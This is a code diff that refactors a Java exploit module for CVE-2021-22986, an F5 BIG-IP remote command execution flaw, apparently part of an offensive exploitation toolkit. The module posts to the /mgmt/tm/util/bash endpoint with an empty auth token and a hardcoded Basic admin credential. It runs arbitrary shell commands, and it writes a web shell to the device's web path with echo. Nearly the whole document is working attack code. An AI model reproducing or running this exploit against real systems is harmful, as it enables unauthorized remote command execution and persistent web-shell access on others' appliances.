@@ -1,12 +1,12 @@
-package fun.fireline.exp.others;
+package fun.fireline.others;
 
 import com.alibaba.fastjson.JSONObject;
 import fun.fireline.core.ExploitInterface;
-import fun.fireline.tools.HttpTool;
+import fun.fireline.tools.HttpTools;
+import fun.fireline.tools.Response;
 import fun.fireline.tools.Tools;
 
 import java.util.HashMap;
-import java.util.UUID;
 
 /**
  * @author yhy
@@ -22,65 +22,49 @@ public class CVE_2021_22986 implements ExploitInterface {
 
     private String target = null;
     private boolean isVul = false;
+    private  HashMap<String, String> headers = new HashMap();
 
     private static final String VULURL = "/mgmt/tm/util/bash";
     private static final String PAYLOAD = "{\"command\":\"run\",\"utilCmdArgs\":\"-c whoami\"}";
 
-    public CVE_2021_22986() {
 
-    }
-
-    public boolean checkVul(String url) {
+    public String checkVul(String url) {
         this.target = url;
 
-        String uuid =  UUID.randomUUID().toString();
-        String path = url + VULURL;
-        try {
+        this.headers.put("Content-type", "application/json");
+        this.headers.put("X-F5-Auth-Token", "");
+        this.headers.put("Authorization", "Basic YWRtaW46QVNhc1M=");
 
-            HashMap<String, String> map = new HashMap();       //请求headers
-            // 设置 header ，执行命令
-            map.put("X-F5-Auth-Token", "");
-            map.put("Authorization", "Basic YWRtaW46QVNhc1M=");
+        Response response = HttpTools.post(this.target + VULURL, PAYLOAD, this.headers, "UTF-8");
 
-            String result = HttpTool.postHttpReuest(path, PAYLOAD, "UTF-8", map, "application/json");
-
-            boolean flag = result.contains("commandResult");
-            if(flag) {
-                this.isVul = true;
-            }
-
-            return flag;
-
-        } catch (Exception e) {
-            logger.error(e);
+        if(response.getText() != null  && response.getText().contains("commandResult")) {
+            this.isVul = true;
+            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
+        } else if (response.getError() != null) {
+            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
+        } else {
+            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
         }
 
-        return false;
     }
 
     public String exeCmd(String cmd, String encoding){
 
-        String path = this.target + VULURL;
-        try {
-            HashMap<String, String> map = new HashMap();       //请求headers
-
-            // 设置 header ，执行命令
-            map.put("X-F5-Auth-Token", "");
-            map.put("Authorization", "Basic YWRtaW46QVNhc1M=");
+        this.headers.put("Content-type", "application/json");
+        this.headers.put("X-F5-Auth-Token", "");
+        this.headers.put("Authorization", "Basic YWRtaW46QVNhc1M=");
 
 
-            String payload = String.format("{\"command\":\"run\",\"utilCmdArgs\":\"-c %s\"}", cmd);
-            String result = HttpTool.postHttpReuest(path, payload, encoding, map, "application/json");
+        String payload = String.format("{\"command\":\"run\",\"utilCmdArgs\":\"-c %s\"}", cmd);
+        Response response = HttpTools.post(this.target + VULURL, payload, this.headers, "UTF-8");
 
-            JSONObject object = JSONObject.parseObject(result);
-            result = object.getString("commandResult");
+        String result = response.getText();
 
-            return result + "\r\n 命令执行成功";
+        JSONObject object = JSONObject.parseObject(result);
+        result = object.getString("commandResult");
 
-        } catch (Exception e) {
-            logger.error(e);
-        }
-        return "命令执行失败";
+        return result;
+
     }
 
     // 上传文件这里并没有实现
@@ -89,14 +73,10 @@ public class CVE_2021_22986 implements ExploitInterface {
         // 因为使用 echo 写 shell ，这里需要对 < > 转义
         String shell_info = Tools.get_escape_shell(fileContent, platform);
 
-        System.out.println(shell_info);
         String path = this.getWebPath();
 
         String cmd = String.format("echo %s > %s", shell_info, path + filename);
-        System.out.println(cmd);
         String str = this.exeCmd(cmd, "UTF-8");
-        System.out.println("\r\n");
-        System.out.println(str);
 
         if(this.target.endsWith("/")) {
             return this.target + "console/images/" + filename;
